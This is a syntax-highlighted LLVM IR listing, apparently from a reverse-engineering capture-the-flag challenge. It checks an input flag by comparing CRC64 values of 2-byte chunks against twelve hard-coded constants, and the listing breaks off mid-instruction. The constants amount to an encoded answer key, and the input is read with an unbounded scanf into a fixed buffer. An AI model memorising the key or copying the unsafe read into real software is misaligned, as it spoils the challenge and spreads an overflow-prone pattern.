<div class="highlight-container" data-rel="Less"><figure class="iseeu highlight less"><table><tr><td class="code"><pre><span class="line">; <span class="selector-tag">ModuleID</span> = &#x27;<span class="selector-tag">Dragon</span><span class="selector-class">.bc</span>&#x27;</span><br><span class="line"><span class="selector-tag">source_filename</span> = &quot;<span class="number">1</span><span class="selector-class">.cpp</span>&quot;</span><br><span class="line"><span class="selector-tag">target</span> <span class="selector-tag">datalayout</span> = &quot;<span class="selector-tag">e-m</span>:<span class="selector-tag">w-p270</span>:<span class="number">32</span>:<span class="number">32</span><span class="selector-tag">-p271</span>:<span class="number">32</span>:<span class="number">32</span><span class="selector-tag">-p272</span>:<span class="number">64</span>:<span class="number">64</span><span class="selector-tag">-i64</span>:<span class="number">64</span><span class="selector-tag">-f80</span>:<span class="number">128</span><span class="selector-tag">-n8</span>:<span class="number">16</span>:<span class="number">32</span>:<span class="number">64</span><span class="selector-tag">-S128</span>&quot;</span><br><span class="line"><span class="selector-tag">target</span> <span class="selector-tag">triple</span> = &quot;<span class="selector-tag">x86_64-pc-windows-msvc19</span><span class="selector-class">.39</span><span class="selector-class">.33522</span>&quot;</span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">printf</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">scanf</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">_vfprintf_l</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">__local_stdio_printf_options</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">_vfscanf_l</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$<span class="selector-tag">__local_stdio_scanf_options</span> = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_0O</span>@<span class="selector-tag">FIGNKBOM</span>@<span class="selector-tag">Input</span>?<span class="number">5</span><span class="selector-tag">U</span>?<span class="number">5</span><span class="selector-tag">flag</span>?<span class="number">3</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_02DKCKIIND</span>@?$<span class="selector-tag">CFs</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_06JPHCLLC</span>@<span class="selector-tag">Error</span>?$<span class="selector-tag">CB</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_07PBILKAFL</span>@<span class="selector-tag">Success</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;?<span class="selector-tag">_OptionsStorage</span>@?<span class="number">1</span>??<span class="selector-tag">__local_stdio_printf_options</span>@@<span class="number">9</span>@<span class="number">4</span><span class="selector-tag">_KA</span>&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">$&quot;?<span class="selector-tag">_OptionsStorage</span>@?<span class="number">1</span>??<span class="selector-tag">__local_stdio_scanf_options</span>@@<span class="number">9</span>@<span class="number">4</span><span class="selector-tag">_KA</span>&quot; = <span class="selector-tag">comdat</span> <span class="selector-tag">any</span></span><br><span class="line"></span><br><span class="line">@<span class="selector-tag">__const</span><span class="selector-class">.main</span><span class="selector-class">.enc</span> = <span class="selector-tag">private</span> <span class="selector-tag">unnamed_addr</span> <span class="selector-tag">constant</span> <span class="selector-attr">[12 x i64]</span> <span class="selector-attr">[i64 -2565957437423125689, i64 224890624719110086, i64 1357324823849588894, i64 -8941695979231947288, i64 -253413330424273460, i64 -7817463785137710741, i64 -5620500441869335673, i64 984060876288820705, i64 -6993555743080142153, i64 -7892488171899690683, i64 7190415315123037707, i64 -7218240302740981077]</span>, <span class="selector-tag">align</span> <span class="number">16</span></span><br><span class="line">@&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_0O</span>@<span class="selector-tag">FIGNKBOM</span>@<span class="selector-tag">Input</span>?<span class="number">5</span><span class="selector-tag">U</span>?<span class="number">5</span><span class="selector-tag">flag</span>?<span class="number">3</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">unnamed_addr</span> <span class="selector-tag">constant</span> <span class="selector-attr">[14 x i8]</span> <span class="selector-tag">c</span>&quot;<span class="selector-tag">Input</span> <span class="selector-tag">U</span> <span class="selector-tag">flag</span>:\<span class="number">00</span>&quot;, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">1</span></span><br><span class="line">@&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_02DKCKIIND</span>@?$<span class="selector-tag">CFs</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">unnamed_addr</span> <span class="selector-tag">constant</span> <span class="selector-attr">[3 x i8]</span> <span class="selector-tag">c</span>&quot;%<span class="selector-tag">s</span>\<span class="number">00</span>&quot;, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">1</span></span><br><span class="line">@&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_06JPHCLLC</span>@<span class="selector-tag">Error</span>?$<span class="selector-tag">CB</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">unnamed_addr</span> <span class="selector-tag">constant</span> <span class="selector-attr">[7 x i8]</span> <span class="selector-tag">c</span>&quot;<span class="selector-tag">Error</span>!\<span class="number">00</span>&quot;, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">1</span></span><br><span class="line">@&quot;??<span class="selector-tag">_C</span>@<span class="selector-tag">_07PBILKAFL</span>@<span class="selector-tag">Success</span>?$<span class="selector-tag">AA</span>@&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">unnamed_addr</span> <span class="selector-tag">constant</span> <span class="selector-attr">[8 x i8]</span> <span class="selector-tag">c</span>&quot;<span class="selector-tag">Success</span>\<span class="number">00</span>&quot;, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">1</span></span><br><span class="line">@&quot;?<span class="selector-tag">_OptionsStorage</span>@?<span class="number">1</span>??<span class="selector-tag">__local_stdio_printf_options</span>@@<span class="number">9</span>@<span class="number">4</span><span class="selector-tag">_KA</span>&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">global</span> <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">@&quot;?<span class="selector-tag">_OptionsStorage</span>@?<span class="number">1</span>??<span class="selector-tag">__local_stdio_scanf_options</span>@@<span class="number">9</span>@<span class="number">4</span><span class="selector-tag">_KA</span>&quot; = <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">global</span> <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">comdat</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">noundef</span> <span class="selector-tag">i64</span> @&quot;?<span class="selector-tag">calculate_crc64_direct</span>@@<span class="selector-tag">YA_KPEBE_K</span>@<span class="selector-tag">Z</span>&quot;(ptr noundef %data, i64 noundef %length) <span class="selector-id">#0</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %length.addr = alloca i64, align 8</span><br><span class="line">  %data.addr = alloca ptr, align 8</span><br><span class="line">  %crc = alloca i64, align 8</span><br><span class="line">  %i = alloca i64, align 8</span><br><span class="line">  %j = alloca i64, align 8</span><br><span class="line">  store i64 %length, ptr %length.addr, align 8</span><br><span class="line">  store ptr %data, ptr %data.addr, align 8</span><br><span class="line">  store i64 -1, ptr %crc, align 8</span><br><span class="line">  store i64 0, ptr %i, align 8</span><br><span class="line">  br label %for.cond</span><br><span class="line"></span><br><span class="line">for.cond:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.inc7</span>, %<span class="selector-tag">entry</span></span><br><span class="line">  %<span class="number">0</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="number">1</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">length</span><span class="selector-class">.addr</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">cmp</span> = <span class="selector-tag">icmp</span> <span class="selector-tag">ult</span> <span class="selector-tag">i64</span> %<span class="number">0</span>, %<span class="number">1</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">i1</span> %<span class="selector-tag">cmp</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.body</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.end9</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.body</span>:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond</span></span><br><span class="line">  %<span class="number">2</span> = <span class="selector-tag">load</span> <span class="selector-tag">ptr</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">data</span><span class="selector-class">.addr</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="number">3</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">arrayidx</span> = <span class="selector-tag">getelementptr</span> <span class="selector-tag">inbounds</span> <span class="selector-tag">i8</span>, <span class="selector-tag">ptr</span> %<span class="number">2</span>, <span class="selector-tag">i64</span> %<span class="number">3</span></span><br><span class="line">  %<span class="number">4</span> = <span class="selector-tag">load</span> <span class="selector-tag">i8</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">arrayidx</span>, <span class="selector-tag">align</span> <span class="number">1</span></span><br><span class="line">  %<span class="selector-tag">conv</span> = <span class="selector-tag">zext</span> <span class="selector-tag">i8</span> %<span class="number">4</span> <span class="selector-tag">to</span> <span class="selector-tag">i64</span></span><br><span class="line">  %<span class="selector-tag">shl</span> = <span class="selector-tag">shl</span> <span class="selector-tag">i64</span> %<span class="selector-tag">conv</span>, <span class="number">56</span></span><br><span class="line">  %<span class="number">5</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">xor</span> = <span class="selector-tag">xor</span> <span class="selector-tag">i64</span> %<span class="number">5</span>, %<span class="selector-tag">shl</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">xor</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.cond1</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.cond1</span>:                                        ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.inc</span>, %<span class="selector-tag">for</span><span class="selector-class">.body</span></span><br><span class="line">  %<span class="number">6</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">cmp2</span> = <span class="selector-tag">icmp</span> <span class="selector-tag">ult</span> <span class="selector-tag">i64</span> %<span class="number">6</span>, <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">i1</span> %<span class="selector-tag">cmp2</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.body3</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.end</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.body3</span>:                                        ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond1</span></span><br><span class="line">  %<span class="number">7</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">and</span> = <span class="selector-tag">and</span> <span class="selector-tag">i64</span> %<span class="number">7</span>, <span class="selector-tag">-9223372036854775808</span></span><br><span class="line">  %<span class="selector-tag">tobool</span> = <span class="selector-tag">icmp</span> <span class="selector-tag">ne</span> <span class="selector-tag">i64</span> %<span class="selector-tag">and</span>, <span class="number">0</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">i1</span> %<span class="selector-tag">tobool</span>, <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.then</span>, <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.else</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">if</span><span class="selector-class">.then</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.body3</span></span><br><span class="line">  %<span class="number">8</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">shl4</span> = <span class="selector-tag">shl</span> <span class="selector-tag">i64</span> %<span class="number">8</span>, <span class="number">1</span></span><br><span class="line">  %<span class="selector-tag">xor5</span> = <span class="selector-tag">xor</span> <span class="selector-tag">i64</span> %<span class="selector-tag">shl4</span>, <span class="number">4823603603198064275</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">xor5</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.end</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">if</span><span class="selector-class">.else</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.body3</span></span><br><span class="line">  %<span class="number">9</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">shl6</span> = <span class="selector-tag">shl</span> <span class="selector-tag">i64</span> %<span class="number">9</span>, <span class="number">1</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">shl6</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.end</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">if</span><span class="selector-class">.end</span>:                                           ; <span class="selector-tag">preds</span> = %<span class="selector-tag">if</span><span class="selector-class">.else</span>, %<span class="selector-tag">if</span><span class="selector-class">.then</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.inc</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.inc</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">if</span><span class="selector-class">.end</span></span><br><span class="line">  %<span class="number">10</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">inc</span> = <span class="selector-tag">add</span> <span class="selector-tag">i64</span> %<span class="number">10</span>, <span class="number">1</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">inc</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.cond1</span>, !<span class="selector-tag">llvm</span><span class="selector-class">.loop</span> !<span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.end</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond1</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.inc7</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.inc7</span>:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.end</span></span><br><span class="line">  %<span class="number">11</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">inc8</span> = <span class="selector-tag">add</span> <span class="selector-tag">i64</span> %<span class="number">11</span>, <span class="number">1</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">inc8</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.cond</span>, !<span class="selector-tag">llvm</span><span class="selector-class">.loop</span> !<span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.end9</span>:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond</span></span><br><span class="line">  %<span class="number">12</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">xor10</span> = <span class="selector-tag">xor</span> <span class="selector-tag">i64</span> %<span class="number">12</span>, <span class="selector-tag">-1</span></span><br><span class="line">  <span class="selector-tag">ret</span> <span class="selector-tag">i64</span> %<span class="selector-tag">xor10</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">norecurse</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">noundef</span> <span class="selector-tag">i32</span> @<span class="selector-tag">main</span>() <span class="selector-id">#1</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %retval = alloca i32, align 4</span><br><span class="line">  %enc = alloca [12 <span class="attribute">x i64], align 16</span></span><br><span class="line"><span class="attribute">  %data = alloca [66 x i8], align 16</span></span><br><span class="line"><span class="attribute">  %i = alloca i64, align 8</span></span><br><span class="line"><span class="attribute">  %j = alloca i64, align 8</span></span><br><span class="line"><span class="attribute">  %crc = alloca i64, align 8</span></span><br><span class="line"><span class="attribute">  store i32 0, ptr %retval, align 4</span></span><br><span class="line"><span class="attribute">  call void @llvm.memcpy.p0.p0.i64(ptr align 16 %enc, ptr align 16 @__const.main.enc, i64 96, i1 false)</span></span><br><span class="line"><span class="attribute">  call void @llvm.memset.p0.i64(ptr align 16 %data, i8 0, i64 66, i1 false)</span></span><br><span class="line"><span class="attribute">  %call = call i32 (ptr, ...) @printf(ptr noundef @&quot;??_C@_0O@FIGNKBOM@Input?5U?5flag?3?$AA@&quot;)</span></span><br><span class="line"><span class="attribute">  %arraydecay = getelementptr inbounds [66 x i8], ptr %data, i64 0, i64 0</span></span><br><span class="line"><span class="attribute">  %call1 = call i32 (ptr, ...) @scanf(ptr noundef @&quot;??_C@_02DKCKIIND@?$CFs?$AA@&quot;, ptr noundef %arraydecay)</span></span><br><span class="line"><span class="attribute">  store i64 0, ptr %i, align 8</span></span><br><span class="line"><span class="attribute">  store i64 0, ptr %j, align 8</span></span><br><span class="line"><span class="attribute">  br label %for.cond</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">for.cond</span>:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.inc</span>, %<span class="selector-tag">entry</span></span><br><span class="line">  %<span class="number">0</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">arraydecay2</span> = <span class="selector-tag">getelementptr</span> <span class="selector-tag">inbounds</span> <span class="selector-attr">[66 x i8]</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">data</span>, <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">i64</span> <span class="number">0</span></span><br><span class="line">  %<span class="selector-tag">call3</span> = <span class="selector-tag">call</span> <span class="selector-tag">i64</span> @<span class="selector-tag">strlen</span>(ptr noundef %arraydecay2)</span><br><span class="line">  %<span class="selector-tag">div</span> = <span class="selector-tag">udiv</span> <span class="selector-tag">i64</span> %<span class="selector-tag">call3</span>, <span class="number">2</span></span><br><span class="line">  %<span class="selector-tag">cmp</span> = <span class="selector-tag">icmp</span> <span class="selector-tag">ult</span> <span class="selector-tag">i64</span> %<span class="number">0</span>, %<span class="selector-tag">div</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">i1</span> %<span class="selector-tag">cmp</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.body</span>, <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.end</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.body</span>:                                         ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond</span></span><br><span class="line">  %<span class="number">1</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">arrayidx</span> = <span class="selector-tag">getelementptr</span> <span class="selector-tag">inbounds</span> <span class="selector-attr">[66 x i8]</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">data</span>, <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">i64</span> %<span class="number">1</span></span><br><span class="line">  %<span class="selector-tag">call4</span> = <span class="selector-tag">call</span> <span class="selector-tag">noundef</span> <span class="selector-tag">i64</span> @&quot;?<span class="selector-tag">calculate_crc64_direct</span>@@<span class="selector-tag">YA_KPEBE_K</span>@<span class="selector-tag">Z</span>&quot;(ptr noundef %arrayidx, i64 noundef <span class="number">2</span>)</span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">call4</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="number">2</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">crc</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="number">3</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">arrayidx5</span> = <span class="selector-tag">getelementptr</span> <span class="selector-tag">inbounds</span> <span class="selector-attr">[12 x i64]</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">enc</span>, <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">i64</span> %<span class="number">3</span></span><br><span class="line">  %<span class="number">4</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">arrayidx5</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">cmp6</span> = <span class="selector-tag">icmp</span> <span class="selector-tag">ne</span> <span class="selector-tag">i64</span> %<span class="number">2</span>, %<span class="number">4</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">i1</span> %<span class="selector-tag">cmp6</span>, <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.then</span>, <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.end</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">if</span><span class="selector-class">.then</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.body</span></span><br><span class="line">  %<span class="selector-tag">call7</span> = <span class="selector-tag">call</span> <span class="selector-tag">i32</span> (ptr, ...) @<span class="selector-tag">printf</span>(ptr noundef @<span class="string">&quot;??_C@_06JPHCLLC@Error?$CB?$AA@&quot;</span>)</span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i32</span> <span class="number">0</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">retval</span>, <span class="selector-tag">align</span> <span class="number">4</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">return</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">if</span><span class="selector-class">.end</span>:                                           ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.body</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.inc</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.inc</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">if</span><span class="selector-class">.end</span></span><br><span class="line">  %<span class="number">5</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">add</span> = <span class="selector-tag">add</span> <span class="selector-tag">i64</span> %<span class="number">5</span>, <span class="number">2</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">add</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="number">6</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">inc</span> = <span class="selector-tag">add</span> <span class="selector-tag">i64</span> %<span class="number">6</span>, <span class="number">1</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">inc</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.cond</span>, !<span class="selector-tag">llvm</span><span class="selector-class">.loop</span> !<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.end</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond</span></span><br><span class="line">  %<span class="selector-tag">call8</span> = <span class="selector-tag">call</span> <span class="selector-tag">i32</span> (ptr, ...) @<span class="selector-tag">printf</span>(ptr noundef @<span class="string">&quot;??_C@_07PBILKAFL@Success?$AA@&quot;</span>)</span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i32</span> <span class="number">0</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">retval</span>, <span class="selector-tag">align</span> <span class="number">4</span></span><br><span class="line">  <span class="selector-tag">br</span> 